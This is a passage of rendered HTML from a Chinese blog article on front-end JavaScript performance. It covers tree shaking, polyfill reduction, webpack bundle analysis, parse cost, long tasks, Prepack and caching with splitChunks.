punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>可以看到，模块 B 引用了模块 A，但是只使用了 add 方法。因此 minus 方法相当于成为了 Dead Code，将它打包进去没有意义，该方法是永远不会被使用到的。</p>\n<p>注意，我在上面的代码中使用了 ESM 规范的模块语法，而没有使用 CommonJS。这主要是由于 Tree Shaking 算是一种静态分析，而 ESM 本身是一种的静态的模块化规范，所有依赖可以在编译期确定。</p>\n<p>注意，刚才说了 Tree Shaking 非常依赖于 ESM。像是前端流行的工具库 lodash 一般直接安装的版本是非 ESM 的，为了支持 Tree Shaking，我们需要去安装它的 ESM 版本 —— lodash-es 来实现 Tree Shaking。</p>\n<p>此外，Chrome DevTools 也可以帮助你查看加载的 JavaScript 代码的使用覆盖率。</p>\n<h4 id="优化-polyfill-的使用"><a href="#%E4%BC%98%E5%8C%96-polyfill-%E7%9A%84%E4%BD%BF%E7%94%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>优化 polyfill 的使用</h4>\n<p>前端技术的一大特点就是需要考虑兼容性。为了让大家能顺畅地使用浏览器的新特性，一些程序员们开发了新特性对应的 polyfill，用于在非兼容浏览器上也能使用新特性的 API。后续升级不用改动业务代码，只需要删除相应的 polyfill 即可。</p>\n<p>这种舒适的开发体验也让 polyfill 成为了很多项目中不可或缺的一份子。然而 polyfill 也是有代价的，它增加了代码的体积。毕竟 polyfill 也是 JavaScript 写的，不是内置在浏览器中，引入的越多，代码体积也越大。所以，只加载真正所需的 polyfill 将会帮助你减小代码体积。</p>\n<p>首先，不是每个业务的兼容性要求都一样。因此，按你业务的场景来确定引入哪些 polyfill 是最合适的。然而，特性千千万，手动 import 或者添加 Babel Transformer 显然是一件成本极高的事。针对这点，我们可以通过 browserslist 来帮忙，许多前端工具（babel-preset-env/autoprefixer/eslint-plugin-compat）都依赖于它。使用方式可以看这里。</p>\n<p>其次，在 Chrome Dev Summit 2018 上还介绍了一种 Differential Serving 的技术，通过浏览器原生模块化 API 来尽量避免加载无用 polyfill。</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="80066744308956530000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<script type=&quot;module&quot; src=&quot;main.mjs&quot;></script>\n<script nomodule src=&quot;legacy.js&quot;></script>`, `80066744308956530000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>module<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>main.mjs<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">nomodule</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>legacy.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>\n<p>这样，在能够处理 module 属性的浏览器（具有很多新特性）上就只需加载 main.mjs（不包含 polyfill），而在老式浏览器下，则会加载 legacy.js（包含 polyfill）。</p>\n<p>最后，其实在理想上，polyfill 最优的使用方式应该是根据浏览器特性来分发，同一个项目在不同的浏览器，会加载不同的 polyfill 文件。例如 Polyfill.io 就会根据请求头中的客户端特性与所需的 API 特性来按实际情况返回必须的 polyfill 集合。</p>\n<h4 id="webpack"><a href="#webpack" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>webpack</h4>\n<p>webpack 现在已经成为很多前端应用的构建工具，因此这里单独将其列了出来。我们可以通过 webpack-bundle-analyzer 这个工具来查看打包代码里面各个模块的占用大小。</p>\n<p>很多时候，打包体积过大主要是因为引入了不合适的包，对于如何优化依赖包的引入，这里有一些<a href="https://github.com/GoogleChromeLabs/webpack-libs-optimizations" target="_blank" rel="nofollow noreferrer noopener">建议</a>可以帮助你减小 bundle 的体积。</p>\n<p><img src="/static/webpack-bundle-analyzer-ebc4ca216cd037c33fae5eda9d95f6ae.gif"></p>\n<h3 id="解析与执行"><a href="#%E8%A7%A3%E6%9E%90%E4%B8%8E%E6%89%A7%E8%A1%8C" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>解析与执行</h3>\n<p>除了 JavaScript 下载需要耗时外，脚本的解析与执行也是会消耗时间的。</p>\n<h4 id="javascript-的解析耗时"><a href="#javascript-%E7%9A%84%E8%A7%A3%E6%9E%90%E8%80%97%E6%97%B6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>JavaScript 的解析耗时</h4>\n<p>很多情况下，我们会忽略 JavaScript 文件的解析。一个 JavaScript 文件，即使内部没有所谓的“立即执行函数”，JavaScript 引擎也是需要对其进行解析和编译的。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-22-10-02-31-d1d83cf4aada77a653a8e08db8930d69-353d5.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 23.6612702366127%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsSAAALEgHS3X78AAAAwUlEQVQY033LyQ6CMABF0f7/z+jChGiixonEKUYBo9AW0SpTK6U4lAIOe4MvZ/MWF/CEeccTwq6LndAnNA44Z4+7yDIuHyJ/ikLWAostNSGbbi5tHQ2WZG0zw45mm7M2tHoLv6WHDT1u1gBwtTO6QzTqxpZz3Xv78dToaO6kj/XJXOtDTD36OoTqEBW/QEYjaJrUs6u7eBd5TE7IMjlxUh8FGCol3/UDMs/JJUiS5FVV38+FIH6YpkzchFSqLMo/8QfC6BAYvOaF7wAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 22 10 02 31" title="" data-src="/static/2021-07-22-10-02-31-d1d83cf4aada77a653a8e08db8930d69-fee1c.png" data-srcset="/static/2021-07-22-10-02-31-d1d83cf4aada77a653a8e08db8930d69-a67b7.png 200w,\n/static/2021-07-22-10-02-31-d1d83cf4aada77a653a8e08db8930d69-0b187.png 400w,\n/static/2021-07-22-10-02-31-d1d83cf4aada77a653a8e08db8930d69-fee1c.png 800w,\n/static/2021-07-22-10-02-31-d1d83cf4aada77a653a8e08db8930d69-b1a91.png 1200w,\n/static/2021-07-22-10-02-31-d1d83cf4aada77a653a8e08db8930d69-95179.png 1600w,\n/static/2021-07-22-10-02-31-d1d83cf4aada77a653a8e08db8930d69-353d5.png 1606w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>从上图可以看出，解析与编译消耗了好几百毫秒。所以换一个角度来说，删除不必要的代码，对于降低 Parse 与 Compile 的负载也是很有帮助的。</p>\n<p>同时，我们从前一节已经知道，JavaScript 的解析、编译和执行会阻塞页面解析，延迟用户交互。所以有时候，加载同样字节数的 JavaScript 对性能的影响可能会高于图片，因为图片的处理可以放在其他线程中并行执行。</p>\n<h4 id="避免-long-task"><a href="#%E9%81%BF%E5%85%8D-long-task" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>避免 Long Task</h4>\n<p>对于一些单页应用，在加载完核心的 JavaScript 资源后，可能会需要执行大量的逻辑。如果处理不好，可能会出现 JavaScript 线程长时间执行而阻塞主线程的情况。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-22-10-08-35-e329ee6d60d5fe99d02613bea9e00d9d-93d03.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 27.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsSAAALEgHS3X78AAAA9klEQVQY042QUW+CMBRG+f+/ai+b7sFMMwScYpyKpRYUSovgdGdX48Neluzh5Gua5vS7N0jTmO06JNuEqEzYhuhdxF7diNnL2eQJVV1Q20qoqaxlm+fstEYXhWSOUhllWRDo0lL7jsp1HJtWOGHbM76/3nG+x8ndNEl4iyMms4jpYk6ySlmulxi1wZlC3jis8wS2vdB2F/xvThfcna97eslBFPMUfjCcf/I8W5GXRw5mwV6nNK6nFhopEtRehLc23d+052+STPEyWjN6N7yOc/Shp/WlrKKUT680jxL/Fi6UYSii14lhMJbdHXu8O4iwekwjntOZH7y8eWxkjgbaAAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 22 10 08 35" title="" data-src="/static/2021-07-22-10-08-35-e329ee6d60d5fe99d02613bea9e00d9d-fee1c.png" data-srcset="/static/2021-07-22-10-08-35-e329ee6d60d5fe99d02613bea9e00d9d-a67b7.png 200w,\n/static/2021-07-22-10-08-35-e329ee6d60d5fe99d02613bea9e00d9d-0b187.png 400w,\n/static/2021-07-22-10-08-35-e329ee6d60d5fe99d02613bea9e00d9d-fee1c.png 800w,\n/static/2021-07-22-10-08-35-e329ee6d60d5fe99d02613bea9e00d9d-b1a91.png 1200w,\n/static/2021-07-22-10-08-35-e329ee6d60d5fe99d02613bea9e00d9d-95179.png 1600w,\n/static/2021-07-22-10-08-35-e329ee6d60d5fe99d02613bea9e00d9d-5d5ba.png 2400w,\n/static/2021-07-22-10-08-35-e329ee6d60d5fe99d02613bea9e00d9d-93d03.png 2880w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>例如在上图中，帧率下降明显的地方出现了 Long Task，伴随着的是有一段超过 700 ms 的脚本执行时间。而性能指标 FCP 与 DCL 处于其后，一定程度上可以认为，这个 Long Task 阻塞了主线程并拖慢了页面的加载时间，严重影响了前端性能与体验。</p>\n<p>想要了解更多关于 Long Task 的内容，可以看看 Long Task 相关的<a href="https://w3c.github.io/longtasks/" target="_blank" rel="nofollow noreferrer noopener">标准</a>。</p>\n<h4 id="是否真的需要框架"><a href="#%E6%98%AF%E5%90%A6%E7%9C%9F%E7%9A%84%E9%9C%80%E8%A6%81%E6%A1%86%E6%9E%B6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>是否真的需要框架</h4>\n<p>相信如果现在问大家，我们是否需要 React、Vue、Angular 或其他前端框架（库），大概率是肯定的。</p>\n<p>但是我们可以换个角度来思考这个问题。类库/框架帮我们解决的问题之一是快速开发与后续维护代码，很多时候，类库/框架的开发者是需要在可维护性、易用性和性能上做取舍的。对于一个复杂的整站应用，使用框架给你的既定编程范式将会在各个层面提升你工作的质量。但是，对于某些页面，我们是否可以反其道行之呢？</p>\n<p>例如产品经理反馈，咱们的落地页加载太慢了，用户容易流失。这时候你会开始优化性能，用上这次「性能之旅」里的各种措施。但你有没有考虑过，对于像落地页这样的、类似静态页的页面，是不是可以“返璞归真”？</p>\n<p>也许你使用了 React 技术栈 —— 你加载了 React、Redux、React-Redux、一堆 Reducers…… 好吧，整个 JavaScript 可能快 1MB 了。更重要的是，这个页面如果是用于拉新的，这也代表着访问者并没有缓存可以用。好吧，为了一个静态页（或者还有一些非常简单的表单交互），用户付出了高额的成本，而原本这只需要 50 行不到的代码。所以有时候考虑使用原生 JavaScript 来实现它也是一种策略。Netflix 有一篇<a href="https://medium.com/dev-channel/a-netflix-web-performance-case-study-c0bcde26a9d9" target="_blank" rel="nofollow noreferrer noopener">文章</a>介绍了他们是如何通过这种方式大幅缩减加载与操作响应时间的。</p>\n<p>当然，还是强调一下，并不是说不要使用框架/类库，只是希望大家不要拘泥于某个思维定式。做工具的主人，而不是工具的“奴隶”。</p>\n<h4 id="针对代码的优化"><a href="#%E9%92%88%E5%AF%B9%E4%BB%A3%E7%A0%81%E7%9A%84%E4%BC%98%E5%8C%96" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>针对代码的优化</h4>\n<blockquote>\n<p>请注意，截止目前（2019.08）以下内容不建议在生产环境中使用。</p>\n</blockquote>\n<p>还有一种优化思路是把代码变为最优状态。它其实算是一种编译优化。在一些编译型的静态语言上（例如 C++），通过编译器进行一些优化非常常见。</p>\n<p>这里要提到的就是 facebook 推出的 Prepack。例如下面一段代码：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="7888717766097564000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`(function() {\n  function hello() {\n    return \'hello\';\n  }\n  function world() {\n    return \'world\';\n  }\n  global.s = hello() + \' \' + world();\n})();`, `7888717766097564000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n  <span class="token keyword">function</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    <span class="token keyword">return</span> <span class="token string">\'hello\'</span><span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n  <span class="token keyword">function</span> <span class="token function">world</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    <span class="token keyword">return</span> <span class="token string">\'world\'</span><span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n  global<span class="token punctuation">.</span>s <span class="token operator">=</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">\' \'</span> <span class="token operator">+</span> <span class="token function">world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>可以优化为：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="37952624543566910000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`s = \'hello world\';`, `37952624543566910000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js">s <span class="token operator">=</span> <span class="token string">\'hello world\'</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<p>不过很多时候，代码体积和运行性能是会有矛盾的。同时 Prepack 也还不够成熟，所以不建议在生产环境中使用。</p>\n<h3 id="缓存-1"><a href="#%E7%BC%93%E5%AD%98-1" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>缓存</h3>\n<p>JavaScript 部分的缓存与我们在第一部分里提到的缓存基本一致，如果你记不太清了，可以回到咱们的第一站。</p>\n<h4 id="发布与部署"><a href="#%E5%8F%91%E5%B8%83%E4%B8%8E%E9%83%A8%E7%BD%B2" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>发布与部署</h4>\n<p>这里简单提一下：大多数情况下，我们对于 JavaScript 与 CSS 这样的静态资源，都会启动 HTTP 缓存。当然，可能使用强缓存，也可能使用协商缓存。当我们在强缓存机制上发布了更新的时候，如何让浏览器弃用缓存，请求新的资源呢？</p>\n<p>一般会有一套配合的方式：首先在文件名中包含文件内容的 Hash，内容修改后，文件名就会变化；同时，设置不对页面进行强缓存，这样对于内容更新的静态资源，由于 uri 变了，肯定不会再走缓存，而没有变动的资源则仍然可以使用缓存。</p>\n<p>上面说的主要涉及前端资源的发布和部署，详细可以看<a href="https://www.zhihu.com/question/20790576/answer/32602154" target="_blank" rel="nofollow noreferrer noopener">这篇内容</a>，这里就不展开了。</p>\n<h4 id="将基础库代码打包合并"><a href="#%E5%B0%86%E5%9F%BA%E7%A1%80%E5%BA%93%E4%BB%A3%E7%A0%81%E6%89%93%E5%8C%85%E5%90%88%E5%B9%B6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>将基础库代码打包合并</h4>\n<p>为了更好利用缓存，我们一般会把不容易变化的部分单独抽取出来。例如一个 React 技术栈的项目，可能会将 React、Redux、React-Router 这类基础库单独打包出一个文件。</p>\n<p>这样做的优点在于，由于基础库被单独打包在一起了，即使业务代码经常变动，也不会导致整个缓存失效。基础框架/库、项目中的 common、util 仍然可以利用缓存，不会每次发布新版都会让用户花费不必要的带宽重新下载基础库。</p>\n<p>所以一种常见的策略就是将基础库这种 Cache 周期较长的内容单独打包在一起，利用缓存减少新版本发布后用户的访问速度。这种方法本质上是将缓存周期不同的内容分离了，隔离了变化。</p>\n<p>webpack 在 v3.x 以及之前，可以通过 CommonChunkPlugin 来分离一些公共库。而升级到 v4.x 之后有了一个新的配置项 <code class="language-text">optimization.splitChunks</code>:</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="93866379277543050000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`// webpack.config.js\nmodule.exports = {\n  //...\n  optimization: {\n    splitChunks: {\n      chunks: \'all\',\n      minChunks: 1,\n      cacheGroups: {\n        commons: {\n          minChunks: 1,\n          automaticNamePrefix: \'commons\',\n          test: /[\\\\/]node_modules[\\\\/]react|redux|react-redux/,\n          chunks: \'all\'\n        }\n      }\n    }\n  }\n};`, `93866379277543050000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token comment">// webpack.config.js</span>\nmodule<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>\n  <span class="token comment">//...</span>\n  optimization<span class="token punctuation">:</span> <span class="token punctuation">{</span>\n    splitChunks<span class="token punctuation">:</span> <span class="token punctuation">{</span>\n      chunks<span class="token punctuation">:</span> <span class="token string">\'all\'</span><span class="token punctuation">,</span>\n      minChunks<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>\n      cacheGroups<span class="token punctuation">:</span> <span class="token punctuation">{</span>\n        commons<span class="token punctuation">:</span> <span class="token punctuation">{</span>\n          minChunks<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>\n          automaticNamePrefix<span class="token punctuation">:</span> <span class="token string">\'commons\'</span><span class="token punctuation">,</span>\n          test<span class="token punctuation">:</span> <span class="token regex">/[\\\\/]node_modules[\\\\/]react|redux|react-redux/</span><span class="token punctuation">,</span>\n          chunks<span class="token punctuation">:</span> <span class="token string">\'all\'</span>\n        <span class="token punctuation">}</span>\n      <span class="token punctuation">}</span>\n    <span class="token punctuation">}</span>\n  <span class="token punctuation">}</span>\n<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id="减少-webpack-编译不当带来的缓存失效"><a href="#%E5%87%8F%E5%B0%91-webpack-%E7%BC%96%E8%AF%91%E4%B8%8D%E5%BD%93%E5%B8%A6%E6%9D%A5%E7%9A%84%E7%BC%93%E5%AD%98%E5%A4%B1%E6%95%88" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>减少 webpack 编译不当带来的缓存失效</h4>\n<p>由于 webpack 已经成为前端主流的构建工具，因此这里再特别提一下使用 webpack 时的一些注意点，减少一些不必要的缓存失效。</p>\n<p>我们知道，对于每个模块 webpack 都会分配一个唯一的模块 ID，一般情况下 webpack 会使用自增 ID。这就可能导致一个问题：一些模块虽然它们的代码没有变化，但由于增/删了新的其他模块，导致后续所有的模块 ID 都变更了，文件 MD5 也就变化了。另一个问题在于，webpack 